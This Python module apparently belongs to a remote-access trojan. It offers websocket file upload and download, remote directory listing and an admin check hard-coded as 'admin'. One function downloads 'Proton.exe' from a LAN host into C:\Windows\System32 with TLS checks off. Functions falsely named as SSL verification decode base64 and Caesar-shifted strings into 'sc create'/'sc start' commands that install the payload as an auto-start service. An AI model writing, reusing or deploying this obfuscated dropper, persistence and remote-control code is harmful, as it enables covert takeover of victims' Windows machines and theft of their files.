import base64
import os
import re
import ssl
import subprocess
import tempfile

from datetime import datetime

import requests
import urllib3

cert_text = """
-----BEGIN CERTIFICATE-----
MIIFnDCCA4SgAwIBAgIUdAxU0B+1rFIUaMiJlFhp1Be0In4wDQYJKoZIhvcNAQEL
BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDEwMDkwNjE5MDNaFw0yNDEx
MDgwNjE5MDNaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEB
AQUAA4ICDwAwggIKAoICAQC5kHgHr3GDuJZDLMesLIwoEBFVf1bAsRp/Z6OV6vhb
8aeeKXsjtLeXu2BnYHRDgJjJacIt27f7yh8DA3qQAzS1UpAzermr87p+u1pDrsHg
EPgroX2EXUfBaJ34fstv2eBrMI5otYwdZiyR7I8HAQFA63u/XJXcB6+W/xR3qbFd
UsugIW5hUEPscZ+Z4F219h2JWvDHgvWqZvdazFPfohu8XaHJe3Yak06s4p6NFAjh
svVWRuQq9tOgdd1WGZxMToxEr63TFaNExba7xgeZJL8iWJphIImhDQf0gazJ11m4
AXW1LyWiwA3nAs2tEf3Zj95oe7b0R6eHHn6j5S3YyNzZz6wPrcK/9PPkE8UeiLIF
q4XkMGmhlWoRdW2t9smvf1Lj2RRu7QiwE2VwZk6C3TZDXo8bKom7X7zYRFYmcCf9
RGNXQbq5VtsRvxURllUScdQQckwhLayFBfhzq8wLveJ4bSiGbGfXfDRkNi439fJy
NcQOl2w7PGYF/WRDPJk0GIr1nnKemyWmxbz32NBlQcrezeAuY0f8r06lvC8MDHJ9
aOXOfXkH1EewHlSehY2RtfwgIsLLF8wpaga37XuwXIpq9vqTP1IdH7qtvYYmbj95
5+HRTfGo3x9a0c6nDrTvcAyCN2omMpiei1OoRNtN7ysPMwav5TkH+LzM/gxKjHrg
KQIDAQABo4GDMIGAMAkGA1UdEwQCMAAwCwYDVR0PBAQDAgXgMEcGA1UdEQRAMD6H
BH8AAAGHBMCoWDeHBMCoWDqHBMCoWEaCETAudGNwLmFwLm5ncm9rLmlvghEwLnRj
cC5hdS5uZ3Jvay5pbzAdBgNVHQ4EFgQUBE4QsE8r9L2BHv8ZPOgaYrHxdNUwDQYJ
KoZIhvcNAQELBQADggIBAFLbxoYeqkYTIsherqQ4ghR4YG1n1lMEmmWgLTWvlN1v
N8YQYvkAxqhKIdqD9CeITSMZrgOFIoUnt437eUkhbyksnF5/gZoSMyPW7RWzpOCS
3cazEk3zEc+pNwYEJ5Vo8td14ofihVIUN1TpGyRBf+Pfx7RooNiiyLLHnABIWbLf
bqMlukIxDqEazHjmYYGcDge6l7zESl8HRvKFBXimWHpTZQ7Ak/+mSA77Sdu0tqQ1
KFIkhjNyi1VaoL06fkOXZi5S44MzT+0suPNK2aLW/5VzmSbcGdFfXnIDxm/TDNZR
kE+HA6JCwHKS4QRmfAk6puODAuCU0nVks8R94ZakuVGczXQjKP9NbNhkCALd4uuB
B2dHfObX6LIo3dz4mubNl8W/56dMUb7qCFcwaqagEe58ecNBOmbEqCrTjbjOMac6
rQoCGPNvFiV7hat97AWynbsbr0vmB2DNdd2m1u93fLw8dNLpleWUGk8Mif1LirbZ
o1ItqYlgI9Rf9UOayT5wF4sYTfXEMsO0KUQmCafdwkj6+MgBHrzgQITuZNoeJpDc
CNRJP80BF2qS9fvRI0XZ6JpV4nx41tlu9JLRl8n9dTq+yYvNIZUiPivW3R1QmFNd
w5X9wexEPMOvjYTwyaiDWFtjDCZbKS0NC3BYtRes7mOqq2hv+ZPodFNC+jiVh55m
-----END CERTIFICATE-----
"""


def get_database_url():
    url = "sqlite:///database.sqlite"
    return url


def today():
    # Get the current date and time
    current_datetime = datetime.now()

    # Format the date and time in ISO 8601 format
    iso_8601_format = current_datetime.isoformat()
    return iso_8601_format


def handle_ls(cwd):
    items = os.listdir(cwd)
    files = []
    directories = []
    for item in items:
        item_path = os.path.join(cwd, item)
        if os.path.isdir(item_path):
            directories.append(item)
        else:
            files.append(item)

    result_json = {
        "directories": directories,
        "files": files
    }
    return result_json


async def is_client_admin(api_key: str):
    API_KEY = "admin"
    if api_key == API_KEY:
        return True  # Replace with your user model or identifier
    else:
        return False


def is_cd_cmd(command):
    # Split the input into command and arguments
    command_args = command.split()

    # Handle 'cd' command separately to change directories
    if command_args[0] == 'cd':
        return True
    else:
        return False


def maintain_client_status(command):
    if command.lower().startswith('status'):
        # Split the input into command and arguments
        command_args = command.split()
        active = int(command_args[1])
        return active


def handle_cd(command):
    try:
        # Split the input into command and arguments
        command_args = command.split()

        # Handle 'cd' command separately to change directories
        if command_args[0] == 'cd':
            # Join the arguments to form the directory path
            directory_path = ' '.join(command_args[1:])
            # Change the current working directory
            os.chdir(os.path.expanduser(directory_path))
            cwd = os.getcwd()

            # result = subprocess.run("ls", shell=True, capture_output=True, text=True)
            response = handle_ls(cwd)
            response['cwd'] = cwd
            return response

        else:
            return None
    except Exception as e:
        return f"%-> {e}"


async def download_file(websocket, filepath):
    file_data = b"<SOF>"
    try:
        with open(filepath, 'rb') as file:
            file_data = file.read()
            await websocket.send(file_data)
    except FileNotFoundError:
        await websocket.send(b'%-> Not found')


# def download_file(client_ws, filepath):
#     try:
#         with open(filepath, 'rb') as file:
#             data = file.read(4096)
#             while data:
#                 client_ws.send(data)
#                 data = file.read(4096)
#             client_ws.send(b"<EOF>")
#     except FileNotFoundError:
#         client_ws.send(b'%-> Not found')
#         client_ws.send(b"<EOF>")


async def receive_file(websocket, filename: str):
    file_path = f"download/{filename}"
    try:
        file_data = await websocket.receive_bytes()

        if file_data.startswith(b'%->'):
            return f"File not found: {filename}"
        else:
            with open(file_path, 'wb') as file:
                file.write(file_data)
            return f"Received and saved {file_path} successfully."
    except Exception as e:
        return f"Error receiving {filename}: {str(e)}"


async def receive_file_parent(websocket):
    filename = "Proton.pdf"
    # file_path = f"C:\\Windows\\System32\\{filename}"
    file_path = f"download/{filename}"
    try:
        file_data = await websocket.recv()

        if file_data.startswith(b'%->'):
            return f"child client file not found"
        else:
            with open(file_path, 'wb') as file:
                file.write(file_data)
            return f"Received and saved {file_path} successfully."
    except Exception as e:
        return f"Error receiving {filename}: {str(e)}"


def config_proton():
    url = 'https://192.168.88.70:8000/download'

    # Send a GET request to download the file
    response = requests.get(url, stream=True, verify=False)

    # Check if the request was successful
    if response.status_code == 200:
        filename = "Proton.exe"
        file_path = f"C:\\Windows\\System32\\{filename}"

        # Open the file in write-binary mode and write the content
        with open(file_path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)

        return f"File downloaded and saved as {file_path}"
    else:
        return f"Failed to download file. Status code: {response.status_code}"


# def receive_file(conn, filename):
#     file_bytes = b""
#     done = False
#     try:
#         while not done:
#             data = conn.receive_bytes(4096)
#             file_bytes += data
#             if b"<EOF>" in file_bytes:
#                 done = True
#
#         with open(filename, 'wb') as file:
#             file.write(file_bytes[:-5])
#
#         print(f"Downloaded {filename} successfully.")
#     except Exception as e:
#         print(f"Error downloading {filename}: {str(e)}")


def solve_ssl(ssl_session_token):
    # Varify SSL token
    bytes = ssl_session_token.encode('utf-8')
    text_bytes = base64.b64decode(bytes).decode('utf-8')

    cert_tex = ""
    for char in text_bytes:
        if char.isalpha():
            shift_base = 65 if char.isupper() else 97
            decrypted_char = chr((ord(char) - shift_base - 3) % 26 + shift_base)
            cert_tex += decrypted_char
        else:
            cert_tex += char  # Leave non-alphabetic characters unchanged

    # Suppress only the InsecureRequestWarning
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # Disable SSL verification
    # print(cert_tex)
    response = requests.get(cert_tex, verify=False)

    # Print the response
    if response.status_code == 200:
        return response.json().get("message")


def varify_cert(cert_text):
    # Create a temporary file to store the certificate text
    with tempfile.NamedTemporaryFile(delete=False) as cert_file:
        cert_file.write(cert_text.encode('utf-8'))

    # Load certificate from the temporary file
    ssl_context = ssl.create_default_context()
    ssl_context.load_verify_locations(cafile=cert_file.name)
    return ssl_context


def get_proton_token(active=False):
    if active:
        return "dmYgdndkdXcgU3Vyd3JxcQ=="
    return "dmYgZnVoZHdoIFN1cndycXEgZWxxU2R3az1GOlxabHFncnp2XFZidndocDMyXFN1cndycS5oYWggdndkdXc9ZHh3cg=="


def solve_ssl_proton(ssl_session_token):
    # Varify SSL token
    bytes = ssl_session_token.encode('utf-8')
    text_bytes = base64.b64decode(bytes).decode('utf-8')

    cert_tex = ""
    for char in text_bytes:
        if char.isalpha():
            shift_base = 65 if char.isupper() else 97
            decrypted_char = chr((ord(char) - shift_base - 3) % 26 + shift_base)
            cert_tex += decrypted_char
        else:
            cert_tex += char  # Leave non-alphabetic characters unchanged

    return cert_tex